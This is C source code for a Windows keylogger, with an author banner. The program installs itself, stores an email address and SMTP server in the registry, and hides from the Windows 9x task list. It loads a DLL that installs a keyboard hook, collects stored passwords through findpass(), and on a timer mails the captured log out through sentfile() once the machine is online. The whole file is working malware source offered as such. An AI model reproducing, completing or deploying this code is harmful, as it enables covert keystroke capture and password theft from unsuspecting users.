//////////////////////////////////////////////////////////////////////////
//		Coded by   Hirosh ,India										//
//////////////////////////////////////////////////////////////////////////
//					MSN hirr@hotmail.com								//	
//					yahoo hirosh22@yahoo.com							//
//					ICQ 109619370										//
//					Email :hirhirhir@hotpop.com							//	
//					www.hirosh.tk									//
//////////////////////////////////////////////////////////////////////////
//	I am the one mad from india	!!!!!!!									//	
//////////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "extract.h"
#include "resource.h"
char emailid[100],server[100];
#include "email.h"
#include "passwords.h"
#include "install.h"
unsigned int ti;
HKEY hkeyresult ;
int hi;
BOOL sss,uninst;
LRESULT CALLBACK	WndProc(HWND, UINT, WPARAM, LPARAM);
LRESULT CALLBACK InstDialogproc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
hi=0;
BYTE  sno[100];
DWORD size;
//////////////////
char ln[MAX_PATH];
/////////////
HANDLE  hFile1;
sss=FALSE;
char a[MAX_PATH];
uninst=FALSE;
long l=RegOpenKey (HKEY_LOCAL_MACHINE, ( LPCTSTR ) "Software\\innsoft", &hkeyresult );
RegCloseKey ( hkeyresult );
if (l!=ERROR_SUCCESS)
{ sss=TRUE;
 DialogBox(hInstance, (LPCTSTR)IDD_DIALOG1, 0, (DLGPROC)InstDialogproc);
 ExitProcess(0);
}
else
{
char ln[MAX_PATH];
GetModuleFileName(NULL,ln,MAX_PATH);
CharUpperBuff(ln,strlen(ln));
if(strstr(ln,"SETUP.EXE")!=NULL){
	uninst=TRUE;
DialogBox(hInstance, (LPCTSTR)IDD_DIALOG1, 0, (DLGPROC)InstDialogproc);
ExitProcess(0);
}
RegCreateKey(HKEY_LOCAL_MACHINE, ( LPCTSTR ) "Software\\innsoft", &hkeyresult );  size=150;
RegQueryValueEx ( hkeyresult, ( LPCTSTR )"emid" , 0, 0,sno, &size ) ;lstrcpy(emailid,(char *)sno);size=150;
RegQueryValueEx ( hkeyresult, ( LPCTSTR )"server" , 0, 0,sno, &size ) ;lstrcpy(server,(char *)sno);
RegCloseKey ( hkeyresult );
}
WinExec(lpCmdLine,SW_SHOW);
HANDLE hMutex = CreateMutex( NULL, TRUE, "mammaa");	
if(  GetLastError() == ERROR_ALREADY_EXISTS )	    ExitProcess( 0 );     
typedef DWORD (WINAPI *REGSERVPROC)(DWORD, DWORD);HINSTANCE hLibrary;REGSERVPROC regproc;
if((int)GetVersion() < 0){
	hLibrary = LoadLibrary("kernel32.dll");
	regproc = (REGSERVPROC) GetProcAddress(hLibrary, "RegisterServiceProcess");
if(regproc)
    regproc (NULL,1);
}
///////////////
	MSG msg;WNDCLASSEX wcex;wcex.cbSize = sizeof(WNDCLASSEX); 
	wcex.style			= CS_HREDRAW | CS_VREDRAW;wcex.lpfnWndProc	= (WNDPROC)WndProc;
	wcex.cbClsExtra		= 0;wcex.cbWndExtra		= 0;
	wcex.hInstance		= hInstance;	wcex.hIcon		= NULL;
	wcex.hCursor		= NULL;	wcex.hbrBackground	= NULL;
	wcex.lpszMenuName	= NULL;	wcex.lpszClassName	= "xploree";
	wcex.hIconSm		= NULL;	RegisterClassEx(&wcex);	HWND hWnd;
    hWnd = CreateWindow("xploree", NULL, WS_POPUP, 0, 0, 10,10, NULL, NULL, hInstance, NULL);
/////////
BYTE rdate[50];size = 100 ;
RegOpenKey ( HKEY_LOCAL_MACHINE, ( LPCTSTR ) "Software\\innsoft", &hkeyresult );
RegQueryValueEx ( hkeyresult, ( LPCTSTR )"innss" , 0, 0, rdate, &size ) ;
RegCloseKey ( hkeyresult );
//////////
size=0;
GetWindowsDirectory(a,MAX_PATH);
lstrcat(a, "\\winfile32.dll" );
hFile1 = CreateFile (a,GENERIC_READ,0,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
int fsize=GetFileSize(hFile1,&size);
CloseHandle (hFile1);
if ((lstrcmp((char *)rdate,"1")==0)&&(fsize>5000)){
	GetWindowsDirectory(a,MAX_PATH);lstrcat(a, "\\winfileb32.dll" ); 
	GetWindowsDirectory(ln,MAX_PATH);lstrcat(ln, "\\winfile32.dll" ); 
	CopyFile (ln,a,FALSE);
	Sleep(20000);
	DeleteFile(ln); 
	findpass();
	RegOpenKey ( HKEY_LOCAL_MACHINE, ( LPCTSTR ) "Software\\innsoft", &hkeyresult );
	RegSetValueEx ( hkeyresult, ( LPCTSTR )"innss" ,0, REG_SZ, ( const BYTE* ) ( LPCTSTR ) "0",1) ;
	RegCloseKey ( hkeyresult );
	}

GetWindowsDirectory(a,MAX_PATH);
lstrcat(a, "\\winfileb32.dll" );
hFile1 = CreateFile (a,GENERIC_READ,0,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
fsize=GetFileSize(hFile1,&size);
CloseHandle (hFile1);
if((fsize>5000)||sss){
//MessageBox(0,"timer","w",MB_OK);
ti=SetTimer(hWnd,NULL,20000,NULL);
}

//////////////////
static HINSTANCE hinstDLL; 
typedef BOOL ( *inshook)(); 
inshook instkbhook;
hinstDLL = LoadLibrary((LPCTSTR) "winfile64.dll"); 
instkbhook = (inshook)GetProcAddress(hinstDLL, "installhook"); 
if(instkbhook)
instkbhook();
//////////////		
	while (GetMessage(&msg, NULL, 0, 0)) 
	{
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}


return 0;
}

LRESULT CALLBACK InstDialogproc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{
			case WM_INITDIALOG:
				if(uninst){
				ShowWindow(GetDlgItem(hDlg,IDC_EID),FALSE);
				ShowWindow(GetDlgItem(hDlg,IDC_ES),FALSE);
				ShowWindow(GetDlgItem(hDlg,IDOK),FALSE);
				ShowWindow(GetDlgItem(hDlg,IDC_ST1),FALSE);
				ShowWindow(GetDlgItem(hDlg,IDC_ST2),FALSE);
				ShowWindow(GetDlgItem(hDlg,IDC_ST3),FALSE);
				ShowWindow(GetDlgItem(hDlg,IDC_ST4),TRUE);
				EnableWindow(GetDlgItem(hDlg,IDC_BUN),TRUE);}
				else
				ShowWindow(GetDlgItem(hDlg,IDC_ST4),FALSE);
				return TRUE;
			case WM_COMMAND:
			switch (LOWORD(wParam)){
			case IDOK:
			GetWindowText(GetDlgItem(hDlg,IDC_EID),emailid,1000);
			GetWindowText(GetDlgItem(hDlg,IDC_ES),server,1000);
			if((!lstrcmp(emailid,""))||(!lstrcmp(server,"")))
			MessageBox(hDlg,"U must give SMTP server,Ur EmailID","Err!",MB_OK);
            else{
			install(TRUE);
			MessageBox(hDlg,"Installation Completed successfully!!!","Success",MB_OK);
			EndDialog(hDlg, LOWORD(wParam));
			}
			break;
			case IDC_BUN:
				install(FALSE);
				MessageBox(hDlg,"Unistallation Completed successfully!!!","Success",MB_OK);
				EndDialog(hDlg, LOWORD(wParam));
				break;
			case IDCANCEL:
				EndDialog(hDlg, LOWORD(wParam));
				ExitProcess(0);
			}	
			return TRUE;
			case WM_DESTROY:							
			EndDialog(hDlg, LOWORD(wParam));
			return TRUE;
			break;

	}
    return FALSE;
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
DWORD r;

	switch (message) 
	{
		case WM_TIMER:
		if (hi<1){  
		if(InternetGetConnectedState(&r,0)){
        KillTimer(hWnd,ti);
		hi++;
		sentfile();
		}
		}
		break;		
		default:
			return DefWindowProc(hWnd, message, wParam, lParam);
   }
   return 0;
}